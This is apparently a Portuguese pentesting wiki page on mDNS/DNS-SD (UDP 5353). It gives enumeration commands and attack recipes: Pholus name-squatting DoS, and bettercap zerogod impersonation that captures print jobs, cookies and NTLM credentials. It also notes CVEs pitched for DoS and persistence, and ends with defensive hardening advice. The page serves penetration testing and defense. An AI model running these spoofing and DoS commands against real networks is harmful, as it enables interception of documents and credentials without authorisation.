# 5353/UDP Multicast DNS (mDNS) e DNS-SD

{{#include ../banners/hacktricks-training.md}}

## Informações Básicas

Multicast DNS (mDNS) permite resolução de nomes semelhante ao DNS e descoberta de serviços dentro de um link local sem um servidor DNS unicast. Ele usa UDP/5353 e os endereços multicast 224.0.0.251 (IPv4) e FF02::FB (IPv6). DNS Service Discovery (DNS-SD, tipicamente usado com mDNS) fornece uma forma padronizada de enumerar e descrever serviços via registros PTR, SRV e TXT.
```
PORT     STATE SERVICE
5353/udp open  zeroconf
```
Detalhes chave do protocolo que você frequentemente vai aproveitar durante ataques:
- Nomes na zona .local são resolvidos via mDNS.
- O bit QU (Query Unicast) pode solicitar respostas unicast mesmo para consultas multicast.
- Implementações deveriam ignorar pacotes que não se originam do link local; algumas stacks ainda os aceitam.
- Probing/announcing impõe nomes únicos de host/serviço; interferir aqui cria condições de DoS/“name squatting”.

## Modelo de serviço DNS-SD

Serviços são identificados como _<service>._tcp ou _<service>._udp sob .local, por exemplo _ipp._tcp.local (impressoras), _airplay._tcp.local (AirPlay), _adb._tcp.local (Android Debug Bridge), etc. Descubra tipos com _services._dns-sd._udp.local, e então resolva as instâncias descobertas para SRV/TXT/A/AAAA.

## Exploração e Enumeração de Rede

- nmap target scan (mDNS direto em um host):
```bash
nmap -sU -p 5353 --script=dns-service-discovery <target>
```
- nmap broadcast discovery (escute o segmento e enumere todos os tipos/instâncias DNS-SD):
```bash
sudo nmap --script=broadcast-dns-service-discovery
```
- avahi-browse (Linux):
```bash
# List service types
avahi-browse -bt _services._dns-sd._udp
# Browse all services and resolve to host/port
avahi-browse -art
```
- Apple dns-sd (macOS):
```bash
# Browse all HTTP services
dns-sd -B _http._tcp
# Enumerate service types
dns-sd -B _services._dns-sd._udp
# Resolve a specific instance to SRV/TXT
dns-sd -L "My Printer" _ipp._tcp local
```
- Packet capture with tshark:
```bash
# Live capture
sudo tshark -i <iface> -f "udp port 5353" -Y mdns
# Only DNS-SD service list queries
sudo tshark -i <iface> -f "udp port 5353" -Y "dns.qry.name == \"_services._dns-sd._udp.local\""
```

Dica: Alguns browsers/WebRTC usam hostnames mDNS efêmeros para mascarar IPs locais. Se você vir candidatos random-UUID.local na rede, resolva-os via mDNS para pivotar para os IPs locais.

## Ataques

### Interferência na sondagem de nomes mDNS (DoS / name squatting)

Durante a fase de sondagem, um host verifica a unicidade do nome. Responder com conflitos spoofados força-o a escolher novos nomes ou falhar. Isso pode atrasar ou impedir o registro e a descoberta do serviço.

Exemplo com Pholus:
```bash
# Block new devices from taking names by auto-faking responses
sudo python3 pholus3.py <iface> -afre -stimeout 1000
```
### Falsificação e personificação de serviços (MitM)

Personifique serviços DNS-SD anunciados (impressoras, AirPlay, HTTP, compartilhamentos de arquivos) para forçar clientes a se conectarem a você. Isso é especialmente útil para:
- Capturar documentos ao falsificar _ipp._tcp ou _printer._tcp.
- Atrair clientes para serviços HTTP/HTTPS para coletar tokens/cookies ou entregar payloads.
- Combinar com NTLM relay techniques quando clientes Windows negociam auth com serviços falsificados.

Com o módulo zerogod do bettercap (mDNS/DNS-SD spoofer/impersonator):
```bash
# Start mDNS/DNS-SD discovery
sudo bettercap -iface <iface> -eval "zerogod.discovery on"

# Show all services seen from a host
> zerogod.show 192.168.1.42
# Show full DNS records for a host (newer bettercap)
> zerogod.show-full 192.168.1.42

# Impersonate all services of a target host automatically
> zerogod.impersonate 192.168.1.42

# Save IPP print jobs to disk while impersonating a printer
> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/
> zerogod.impersonate 192.168.1.42

# Replay previously captured services
> zerogod.save 192.168.1.42 target.yml
> zerogod.advertise target.yml
```
Também veja generic LLMNR/NBNS/mDNS/WPAD spoofing and credential capture/relay workflows:

{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### Notas sobre problemas recentes de implementação (úteis para DoS/persistência durante engajamentos)

- Avahi reachable-assertion and D-Bus crash bugs (2023) podem terminar o avahi-daemon em distribuições Linux (ex.: CVE-2023-38469..38473, CVE-2023-1981), interrompendo a descoberta de serviços em hosts alvo até o reinício.
- Cisco IOS XE Wireless LAN Controller mDNS gateway DoS (CVE-2024-20303) permite que clientes WLAN adjacentes inundem com mDNS cuidadosamente fabricados, elevando o uso de CPU do WLC e derrubando túneis de AP—útil se precisar forçar roaming de clientes ou resets do controller durante um engagement.
- Apple mDNSResponder logic error DoS (CVE-2024-44183) permite que um processo local em sandbox faça crash no Bonjour para suprimir brevemente publicação/consulta de serviços em endpoints Apple; corrigido nas releases atuais de iOS/macOS.
- Apple mDNSResponder correctness issue (CVE-2025-31222) permitia escalonamento local de privilégios via mDNSResponder; útil para persistência em Macs/iPhones não gerenciados, corrigido em atualizações recentes de iOS/macOS.

### Considerações Browser/WebRTC sobre mDNS

Chromium/Firefox modernos ofuscam host candidates com nomes mDNS aleatórios. Você pode re-expor IPs da LAN em endpoints gerenciados aplicando a política do Chrome `WebRtcLocalIpsAllowedUrls` (ou alternando `chrome://flags/#enable-webrtc-hide-local-ips-with-mdns`/equivalente do Edge) para que o ICE exponha host candidates em vez de mDNS; configure via `HKLM\Software\Policies\Google\Chrome`.

Quando usuários desativam a proteção manualmente (comum em guias de troubleshooting de WebRTC), seus browsers voltam a anunciar host candidates em texto claro, que você pode capturar via mDNS ou sinalização ICE para acelerar a descoberta de hosts.

## Considerações defensivas e OPSEC

- Segment boundaries: Não roteie 224.0.0.251/FF02::FB entre zonas de segurança a menos que um mDNS gateway seja explicitamente necessário. Se tiver que conectar a descoberta, prefira allowlists e rate limits.
- Windows endpoints/servers:
- Para desabilitar completamente name resolution via mDNS, defina o valor de registro e reinicie:
```
HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS = 0 (DWORD)
```
- Em ambientes gerenciados, desative a regra embutida “mDNS (UDP-In)” do Windows Defender Firewall (pelo menos no Domain profile) para evitar processamento de mDNS inbound preservando a funcionalidade home/roaming.
- Em builds mais novos do Windows 11/templates de GPO, use a policy “Computer Configuration > Administrative Templates > Network > DNS Client > Configure multicast DNS (mDNS) protocol” e configure-a como Disabled.
- Linux (Avahi):
- Restrinja a publicação quando não for necessária: defina `disable-publishing=yes`, e restrinja interfaces com `allow-interfaces=` / `deny-interfaces=` em `/etc/avahi/avahi-daemon.conf`.
- Considere `check-response-ttl=yes` e evite `enable-reflector=yes` a menos que estritamente necessário; prefira `reflect-filters=` allowlists ao refletir.
- macOS: Restrinja mDNS inbound em firewalls de host/rede quando Bonjour discovery não for necessário para sub-redes específicas.
- Monitoramento: Alerta para picos incomuns em consultas `_services._dns-sd._udp.local` ou mudanças súbitas em SRV/TXT de serviços críticos; estes são indicadores de spoofing ou impersonação de serviços.

## Referência rápida de ferramentas

- nmap NSE: `dns-service-discovery` and `broadcast-dns-service-discovery`.
- Pholus: active scan, reverse mDNS sweeps, DoS and spoofing helpers.
```bash
# Passive sniff (timeout seconds)
sudo python3 pholus3.py <iface> -stimeout 60
# Enumerate service types
sudo python3 pholus3.py <iface> -sscan
# Send generic mDNS requests
sudo python3 pholus3.py <iface> --request
# Reverse mDNS sweep of a subnet
sudo python3 pholus3.py <iface> -rdns_scanning 192.168.2.0/24
```
- bettercap zerogod: discover, save, advertise, and impersonate mDNS/DNS-SD services (see examples above).

## Spoofing/MitM

O ataque mais interessante que você pode realizar sobre esse serviço é executar um MitM na comunicação entre o cliente e o servidor real. Você pode conseguir arquivos sensíveis (MitM na comunicação com a impressora) ou até credenciais (Windows authentication).\
Para mais informações ver:


{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Referências

- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://books.google.co.uk/books/about/Practical_IoT_Hacking.html?id=GbYEEAAAQBAJ&redir_esc=y)
- [Nmap NSE: broadcast-dns-service-discovery](https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html)
- [bettercap zerogod (mDNS/DNS-SD discovery, spoofing, impersonation)](https://www.bettercap.org/modules/ethernet/zerogod/)
- [Cisco IOS XE WLC mDNS gateway DoS (CVE-2024-20303) advisory](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-wlc-mdns-dos-4hv6pBGf.html)
- [Rapid7 advisory for Apple mDNSResponder CVE-2024-44183](https://www.rapid7.com/db/vulnerabilities/apple-mdnsresponder-cve-2024-44183/)
- [Rapid7 writeup of Apple mDNSResponder CVE-2025-31222](https://www.rapid7.com/db/vulnerabilities/apple-osx-mdnsresponder-cve-2025-31222/)

{{#include ../banners/hacktricks-training.md}}
